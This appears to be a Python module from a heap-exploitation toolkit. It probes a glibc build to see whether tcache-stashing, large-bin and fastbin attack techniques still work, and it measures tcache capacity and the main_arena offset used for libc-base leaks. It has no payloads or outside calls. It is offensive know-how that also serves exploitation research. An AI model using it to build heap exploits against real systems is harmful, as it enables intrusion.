# the arbitrary allocation; keeping the write needs a tcache-bypassing trigger and a tcache filled
# to capacity-1, so that the loop stops after the first stash.
_SMALLBIN_MSG = b"malloc(): smallbin double linked list corrupted\x00"


def smallbin_stash_guard(libc_data: bytes) -> dict:
    """Whether this libc's tcache-stashing unlink is still unchecked, and so whether the stashing
    attack exists at all. One guard site means only the first unlink is checked (the attack is
    live); two means the stashing loop is checked as well."""
    from . import rop
    v = rop.libc_version(libc_data)
    ver = ".".join(str(x) for x in v) if v else "?"
    if libc_data.find(_SMALLBIN_MSG) < 0:
        return {"sites": 0, "unchecked": True, "glibc": ver,
                "reason": "no smallbin unlink check in this libc at all: both unlinks are free"}
    sites = guard_sites(libc_data, _SMALLBIN_MSG)
    if sites is None:
        return {"sites": None, "unchecked": None, "glibc": ver,
                "reason": "the error string's reference could not be located, so the guard sites "
                          "cannot be counted"}
    if sites == 0:
        # The error string IS present, so the check exists; zero counted references means the
        # count failed (the error block reached by fall-through, not a jcc) -- not "unchecked".
        return {"sites": 0, "unchecked": None, "glibc": ver,
                "reason": "the guard's error string is present but no reference to it was "
                          "counted, so the guard sites cannot be counted"}
    unchecked = sites < 2
    return {"sites": sites, "unchecked": unchecked, "glibc": ver,
            "reason": (f"glibc {ver}: {sites} guard site -- only the first smallbin unlink is "
                       "checked, so the stashing loop's `bck->fd = bin` is still a write to a "
                       "chosen address and the fake chunk still reaches the tcache"
                       if unchecked else
                       f"glibc {ver}: {sites} guard sites -- the stashing loop checks "
                       "`bck->fd == tc_victim` too, so the technique is dead on this libc")}


def tcache_bypass_allocators(libc_path=None) -> dict:
    """Which allocation functions still reach `_int_malloc` without consulting the tcache, MEASURED
    by running each one after a free and seeing whether it hands back the freed chunk.

    This decides the tcache stashing attack's trigger, and it is exactly the detail the published
    recipes get wrong on current glibc: they use `calloc`, which on this host takes the tcache head
    like malloc does. Returns {name: bool} plus "measured": False when there is no compiler."""
    import os
    import shutil
    import subprocess
    import tempfile
    key = os.path.realpath(libc_path) if libc_path else "system"
    cache = getattr(tcache_bypass_allocators, "_cache", None)
    if cache is None:
        cache = tcache_bypass_allocators._cache = {}
    if key in cache:
        return cache[key]
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        cache[key] = {"measured": False}
        return cache[key]
    d = tempfile.mkdtemp(prefix="lykos-bypass-")
    try:
        src = os.path.join(d, "a.c")
        with open(src, "w") as f:
            f.write('#include <stdio.h>\n#include <stdlib.h>\n#include <malloc.h>\n'
                    'static void probe(const char *n, void *(*f)(size_t), size_t sz){\n'
                    '  void *a = malloc(sz), *g = malloc(sz); (void)g; free(a);\n'
                    '  void *c = f(sz); printf("%s %d\\n", n, c != a); free(c); }\n'
                    'static void *f_calloc(size_t n){ return calloc(1, n); }\n'
                    'static void *f_memalign(size_t n){ return memalign(0x40, n); }\n'
                    'static void *f_realloc(size_t n){ return realloc(malloc(0x18), n); }\n'
                    'int main(void){ probe("calloc", f_calloc, 0x88);\n'
                    '  probe("memalign", f_memalign, 0x88);\n'
                    '  probe("realloc", f_realloc, 0x88); return 0; }\n')
        exe = os.path.join(d, "a")
        env = dict(os.environ)
        if libc_path:
            env["LD_LIBRARY_PATH"] = (os.path.dirname(os.path.realpath(libc_path)) + ":"
                                      + env.get("LD_LIBRARY_PATH", ""))
        if subprocess.run([gcc, "-O0", "-w", src, "-o", exe], capture_output=True).returncode:
            cache[key] = {"measured": False}
            return cache[key]
        out = subprocess.run([exe], capture_output=True, text=True, timeout=20, env=env).stdout
        res = {"measured": True}
        for line in out.splitlines():
            parts = line.split()
            if len(parts) == 2:
                res[parts[0]] = parts[1] == "1"
        cache[key] = res if len(res) > 1 else {"measured": False}
        return cache[key]
    except Exception:                                  # noqa: BLE001 -- a probe, never fatal
        cache[key] = {"measured": False}
        return cache[key]
    finally:
        shutil.rmtree(d, ignore_errors=True)


# --- are there fastbins at all? ------------------------------------------------------------------
#
# A whole family of techniques (fastbin_dup, and House of Spirit's classic form) exists because a
# fastbin free is the cheapest one in the allocator: a singly-linked push with almost no checks.
# On this host that family has no ground to stand on, and not because of a new check -- measured
# with ONE probe binary run against two libcs:
#
#   glibc 2.35: the 7th free leaves the tcache and lands in a FASTBIN (mangled `fd`, `bk`
#               untouched), and the libc carries both `double free or corruption (fasttop)` and
#               the `mallopt mxfast` knob that sets `global_max_fast`.
#   glibc 2.43: the 17th free leaves the tcache and lands in a BIN (`fd` AND `bk` are arena
#               pointers), and the libc carries NEITHER string.
#
# So fastbins are gone from 2.43. fastbin_dup has nothing to dup into, and House of Spirit has to
# aim its forged chunk at the TCACHE instead -- which is still reachable but has its own checks
# (alignment, size, and the double-free key), so it is a different recipe rather than the same one
# at a different size.
_FASTTOP_MSG = b"double free or corruption (fasttop)\x00"


def fastbins_present(libc_data: bytes) -> dict:
    """Whether this libc still has fastbins, decided from its bytes: the `fasttop` double-free
    check and the `mxfast` knob that sets `global_max_fast` both exist only where fastbins do.

    Returns {present, glibc, reason}. `present` is None when the evidence disagrees, which is a
    result and not a default -- a caller must not quietly assume either way."""
    from . import rop
    v = rop.libc_version(libc_data)
    ver = ".".join(str(x) for x in v) if v else "?"
    fasttop = libc_data.find(_FASTTOP_MSG) >= 0
    mxfast = libc_data.find(b"memory_mallopt_mxfast") >= 0
    if fasttop and mxfast:
        return {"present": True, "glibc": ver,
                "reason": f"glibc {ver}: the fasttop double-free check and the mxfast knob are "
                          "both here, so fastbins exist"}
    if not fasttop and not mxfast:
        return {"present": False, "glibc": ver,
                "reason": f"glibc {ver}: neither the `fasttop` double-free check nor the `mxfast` "
                          "knob that sets global_max_fast is in this libc -- FASTBINS ARE GONE, "
                          "so a free past the tcache goes straight to a bin. Every technique "
                          "whose first step is 'reach the fastbin' has nothing to reach"}
    return {"present": None, "glibc": ver,
            "reason": f"glibc {ver}: the evidence disagrees (fasttop check: {fasttop}, mxfast "
                      f"knob: {mxfast}) -- measure where a freed chunk actually lands with "
                      "`post_tcache_destination` before relying on either answer"}


def post_tcache_destination(libc_path=None, chunk_size: int = 0x30):
    """Where a chunk of `chunk_size` actually goes once its tcache bin is full, MEASURED: free
    same-size chunks until one stops carrying the tcache key, then read its two words.

    "fastbin" -- `fd` is a mangled pointer and `bk` is untouched;
    "bin"     -- `fd` and `bk` are both arena pointers;
    None      -- no compiler, or the chunk never left the tcache.

    This is the live half of `fastbins_present`, and it is the one that settles it: the strings say
    what the libc was built with, this says what the allocator does."""
    import os
    import shutil
    import subprocess
    import tempfile
    key = (os.path.realpath(libc_path) if libc_path else "system", int(chunk_size))
    cache = getattr(post_tcache_destination, "_cache", None)
    if cache is None:
        cache = post_tcache_destination._cache = {}
    if key in cache:
        return cache[key]
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        cache[key] = None
        return None
    req = max(0x18, int(chunk_size) - 8)
    d = tempfile.mkdtemp(prefix="lykos-fastbin-")
    try:
        src = os.path.join(d, "a.c")
        with open(src, "w") as f:
            f.write('#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n'
                    '#define M 128\n'
                    'int main(void){ void *v[M], *g[M]; uintptr_t key = 0;\n'
                    '  for (int i=0;i<M;i++){ v[i]=malloc(%d); g[i]=malloc(%d); }\n'
                    '  for (int i=0;i<M;i++){ free(v[i]);\n'
                    '    uintptr_t fd=((uintptr_t*)v[i])[0], bk=((uintptr_t*)v[i])[1];\n'
                    '    if (i==0){ key = bk; continue; }\n'
                    '    if (bk != key){ puts(bk ? "bin" : "fastbin"); return 0; } }\n'
                    '  puts("tcache"); return 0; }\n' % (req, req))
        exe = os.path.join(d, "a")
        env = dict(os.environ)
        argv = [exe]
        if libc_path:
            ldir = os.path.dirname(os.path.realpath(libc_path))
            ld = os.path.join(ldir, "ld-linux-x86-64.so.2")
            if os.path.exists(ld):                     # run the SAME binary against that libc
                argv = [ld, "--library-path", ldir, exe]
            else:
                env["LD_LIBRARY_PATH"] = ldir + ":" + env.get("LD_LIBRARY_PATH", "")
        if subprocess.run([gcc, "-O0", "-w", src, "-o", exe], capture_output=True).returncode:
            cache[key] = None
            return None
        out = subprocess.run(argv, capture_output=True, text=True, timeout=20, env=env).stdout
        got = out.strip()
        cache[key] = got if got in ("bin", "fastbin") else None
        return cache[key]
    except Exception:                                  # noqa: BLE001 -- a probe, never fatal
        cache[key] = None
        return None
    finally:
        shutil.rmtree(d, ignore_errors=True)


def smallbin_index(chunk_size: int) -> int:
    """glibc's `smallbin_index` for 64-bit: the bin a chunk under 0x400 lands in."""
    return chunk_size >> 4


def small_bin_bin_head(unsorted_off: int, chunk_size: int) -> int:
    """Offset from the libc base to `bin_at(av, smallbin_index(chunk_size))` -- what the fd/bk of
    a chunk in that smallbin disclose, so the stashing attack gets its libc leak for free."""
    return unsorted_off + (smallbin_index(chunk_size) - 1) * 0x10


def largebin_index(chunk_size: int) -> int:
    """glibc's `largebin_index_64`. Two chunks must land in the SAME bin for the attack to have a
    resident to corrupt, and the bin's head address is `unsorted_bin_offset + (index-1)*0x10`."""
    sz = chunk_size
    if (sz >> 6) <= 48:
        return 48 + (sz >> 6)
    if (sz >> 9) <= 20:
        return 91 + (sz >> 9)
    if (sz >> 12) <= 10:
        return 110 + (sz >> 12)
    if (sz >> 15) <= 4:
        return 119 + (sz >> 15)
    if (sz >> 18) <= 2:
        return 124 + (sz >> 18)
    return 126


def large_bin_bin_head(unsorted_off: int, chunk_size: int) -> int:
    """Offset from the libc base to `bin_at(av, largebin_index(chunk_size))`, which is what the
    fd/bk of a lone chunk in that bin disclose -- the libc leak this route gets for free."""
    return unsorted_off + (largebin_index(chunk_size) - 1) * 0x10


def large_bin_guard(libc_data: bytes) -> dict:
    """How many of the two large-bin insertion branches this libc guards, decided by DECODING the
    libc rather than by its version string.

    The `(nextsize)` message has one `lea rdi,[rip+disp]` that loads it; count the jumps that
    target that lea and you have counted the guard sites. Returns
    {sites, arbitrary, glibc, reason}: `arbitrary` is True when a branch still writes unchecked,
    so the write may go anywhere; False when every branch is guarded, in which case the write
    needs `*TARGET` to already hold the resident chunk's address."""
    from . import rop
    v = rop.libc_version(libc_data)
    ver = ".".join(str(x) for x in v) if v else "?"
    off = libc_data.find(_LB_NEXTSIZE_MSG)
    if off < 0:
        return {"sites": 0, "arbitrary": True, "glibc": ver,
                "reason": "no largebin nextsize check in this libc at all (pre-2.30): the "
                          "insertion writes unchecked"}
    sites = guard_sites(libc_data, _LB_NEXTSIZE_MSG)
    if sites is None:
        return {"sites": None, "arbitrary": None, "glibc": ver,
                "reason": "the error string's reference could not be located, so the guard sites "
                          "cannot be counted"}
    if sites == 0:
        # The error string IS present, so the check exists; zero counted references means the
        # count failed (the error block reached by fall-through, not a jcc) -- not "unchecked".
        return {"sites": 0, "arbitrary": None, "glibc": ver,
                "reason": "the guard's error string is present but no reference to it was "
                          "counted, so the guard sites cannot be counted"}
    arbitrary = sites < 2
    return {"sites": sites, "arbitrary": arbitrary, "glibc": ver,
            "reason": (f"glibc {ver}: {sites} guard site(s) -- the short insertion branch writes "
                       "unchecked, so the write may target any address"
                       if arbitrary else
                       f"glibc {ver}: {sites} guard sites -- BOTH insertion branches check "
                       "`fwd->bk_nextsize->fd_nextsize == fwd`, which reads the slot the write "
                       "then overwrites, so the write only lands where TARGET already holds the "
                       "resident chunk's address. The technique is a pointer swap here, not an "
                       "arbitrary write")}


def tcache_capacity(libc_path=None, chunk_size: int = 0x90):
    """How many chunks of `chunk_size` this libc's tcache actually holds, MEASURED: compile a
    probe that frees same-size chunks one at a time and watch for the free whose chunk links into
    a main_arena bin instead (its `fd` becomes a libc pointer rather than a safe-linked word).
    Cached per (libc, size). Returns None when there is no compiler or the probe fails, and the
    caller should then fill-until-spill rather than trust `TCACHE_COUNT`.

    Worth measuring because the number moved: glibc's historical default is 7 and this host's
    2.43 holds 16, so a recipe that frees seven chunks and expects the eighth to reach the
    unsorted bin quietly does nothing at all."""
    import os
    import shutil
    import subprocess
    import tempfile
    key = (os.path.realpath(libc_path) if libc_path else "system", int(chunk_size))
    cache = getattr(tcache_capacity, "_cache", None)
    if cache is None:
        cache = tcache_capacity._cache = {}
    if key in cache:
        return cache[key]
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        cache[key] = None
        return None
    req = max(0x18, int(chunk_size) - 8)               # request whose chunk is chunk_size
    d = tempfile.mkdtemp(prefix="lykos-tcache-")
    try:
        src = os.path.join(d, "a.c")
        with open(src, "w") as f:
            # Spot the spill by the KEY field, not by guessing what a pointer looks like. Every
            # tcache entry carries the same `tcache_key`, and that key is a full-width random
            # word -- it passes any "is this a libc pointer" threshold test, which is exactly how
            # a naive check mistakes a tcache entry for a binned chunk. A chunk that spilled into
            # a bin has a bin pointer there instead, so the first free whose second word stops
            # matching the first free's is the spill.
            f.write('#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n'
                    '#define M 256\n'
                    'int main(void){ void *v[M], *g[M]; uintptr_t key = 0;\n'
                    '  for (int i=0;i<M;i++){ v[i]=malloc(%d); g[i]=malloc(%d); }\n'
                    '  for (int i=0;i<M;i++){ free(v[i]);\n'
                    '    uintptr_t k = ((uintptr_t*)v[i])[1];\n'
                    '    if (i == 0){ key = k; continue; }\n'
                    '    if (k != key){ printf("%%d\\n", i); return 0; } }\n'
                    '  puts("-1"); return 0; }\n' % (req, req))
        exe = os.path.join(d, "a")
        env = dict(os.environ)
        cmd = [gcc, "-O0", "-w", src, "-o", exe]
        if libc_path:                                  # run the probe against THAT libc
            ldir = os.path.dirname(os.path.realpath(libc_path))
            env["LD_LIBRARY_PATH"] = ldir + ":" + env.get("LD_LIBRARY_PATH", "")
        if subprocess.run(cmd, capture_output=True).returncode:
            cache[key] = None
            return None
        out = subprocess.run([exe], capture_output=True, text=True, timeout=20, env=env).stdout
        n = int(out.strip() or -1)
        cache[key] = n if n > 0 else None
        return cache[key]
    except Exception:                                  # noqa: BLE001 -- a probe, never fatal
        cache[key] = None
        return None
    finally:
        shutil.rmtree(d, ignore_errors=True)


def unsorted_bin_offset(libc_path=None):
    """Offset from a libc's load base to where a lone unsorted-bin chunk's fd points
    (`main_arena + 0x60`) -- the value a heap "view of a freed large chunk" leak discloses, so
    `libc_base = leaked - unsorted_bin_offset(libc)`. This is glibc-version-specific and not an
    exported symbol, so it is MEASURED: compile a tiny malloc/free/print helper, run it against the
    given libc under ASLR-off, and read the offset from /proc/maps. Cached per libc. Returns None
    when there is no compiler or the probe fails (the caller then needs an analyst-supplied value)."""
    import os
    import shutil
    import struct
    import subprocess
    import tempfile
    key = os.path.realpath(libc_path) if libc_path else "system"
    cache = getattr(unsorted_bin_offset, "_cache", None)
    if cache is None:
        cache = unsorted_bin_offset._cache = {}
    if key in cache:
        return cache[key]
    gcc = shutil.which("gcc") or shutil.which("cc")
    setarch = shutil.which("setarch")
    if not gcc or not setarch:
        cache[key] = None
        return None
    d = tempfile.mkdtemp(prefix="lykos-arena-")
    try:
        src = os.path.join(d, "a.c")
        with open(src, "w") as f:
            f.write('#include <stdlib.h>\n#include <unistd.h>\n'
                    'int main(){ void*a=malloc(0x430); malloc(0x430); free(a);\n'
                    '  write(1, a, 8); char c; read(0,&c,1); return 0; }\n')  # pause: keep maps live
        exe = os.path.join(d, "a")
        # Compile with a CLEAN env. A bundled libc is a different glibc version than the host, so
        # putting its dir on LD_LIBRARY_PATH makes the HOST gcc/setarch themselves try to load it
        # ("version GLIBC_2.XX not found") and fail. The target's libc is selected at RUN time by
        # the bundled ld's --library-path instead, which touches only the probe, not host tools.
        env = dict(os.environ)
        env.pop("LD_LIBRARY_PATH", None)
        run_cmd = [setarch, "-R", exe]
        if libc_path:                                          # run against a SPECIFIC libc
            libdir = os.path.dirname(os.path.realpath(libc_path))
            # Run the probe under the BUNDLED ld-linux (shipped beside the libc) with --library-path:
            # the standard way to execute a binary against a foreign glibc, so main_arena's offset
            # is measured for THAT libc. LD_LIBRARY_PATH alone fails (host ld cannot load it).
            import glob as _glob
            lds = _glob.glob(os.path.join(libdir, "ld-linux*.so*")) + \
                _glob.glob(os.path.join(libdir, "ld-*.so*"))
            if lds:
                run_cmd = [setarch, "-R", lds[0], "--library-path", libdir, exe]
        if subprocess.run([gcc, src, "-o", exe], capture_output=True, env=env).returncode:
            cache[key] = None
            return None
        proc = subprocess.Popen(run_cmd, stdin=subprocess.PIPE,
                                stdout=subprocess.PIPE, env=env)
        out = proc.stdout.read(8)                               # blocks until the leak is written
        try:
            with open(f"/proc/{proc.pid}/maps") as _f:    # process paused on read()
                maps = _f.read().splitlines()
        except OSError:
            maps = []
        try:
            proc.stdin.write(b"\n"); proc.stdin.flush()        # let it exit
        except OSError:
            pass
        proc.wait(timeout=3)
        leaked = struct.unpack("<Q", out.ljust(8, b"\x00"))[0] if len(out) >= 8 else 0

        def _rng(line):
            a, b = line.split()[0].split("-")
            return int(a, 16), int(b, 16)
        # the leak sits in libc's DATA segment; the load base is the LOWEST libc mapping
        libc_starts = [_rng(m)[0] for m in maps if "libc" in m]
        base = min(libc_starts) if libc_starts else 0
        off = leaked - base if base and leaked > base else None
        cache[key] = off
        return off
    except Exception:                                          # noqa: BLE001
        cache[key] = None
        return None
    finally:
        shutil.rmtree(d, ignore_errors=True)
